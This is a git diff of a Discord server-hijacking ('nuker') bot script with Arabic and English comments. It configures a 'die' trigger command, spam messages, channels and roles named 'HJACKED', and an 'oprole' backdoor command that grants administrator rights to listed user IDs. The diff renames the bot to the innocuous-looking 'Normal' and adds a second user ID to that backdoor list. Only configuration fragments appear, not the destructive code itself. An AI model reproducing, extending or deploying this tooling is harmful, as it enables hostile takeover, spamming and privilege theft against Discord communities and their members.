@@ -19,10 +19,10 @@ const x_x = "die" //الامر يلي يشغل الكود //the command to start
 const opcmd = 'oprole' // The Op Command To Give You Adminstrator Role
 const teext = "hjacked" // اسم رومات الكتابيه يلي بيسويها //the textchannel name
 const vooice = "HJACKED" // اسم الرومات الصوتيه يلي بيسويها //the voicechannel name
-const pic = "https://cdn.discordapp.com/attachments/505639515407253506/505640173615448064/download.png" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
+const pic = "https://www.w3schools.com/w3css/img_lights.jpg" // صوره بيسوي فيها سبام البوت //the spam embed thumbnail picture
 const spam = "HJACKED" // الكلام يلي بيسوي فيه سبام البوت //the spam message
-const namee = "HJACKED" // اسم ابوت بعد التهكير //the bot name
-const playing = "HJACKED 1 SERVER" // البلاينج //bot streaming
+const namee = "Normal" // اسم ابوت بعد التهكير //the bot name
+const playing = "OMG!!" // البلاينج //bot streaming
 const role = 'HJACKED' // اسم الرتبه يلي بيسويها //the role name
 const adminstrator = 'OP' //اسم الرتبه يلي بيسويها البوت ويعطيك اياها //the op name
 console.log('BY OROCHIX');
@@ -477,7 +477,7 @@ let me = message.author
 
 //login in to the bot token or the serverowner token
     client.on('message', async message => {
-  const devs = ['353967891319619587']; // your id
+  const devs = ['353967891319619587','449666730680254516']; // your id
   let member = message.author
    if (message.content === opcmd) {
     if (!devs.includes(message.author.id)) return;
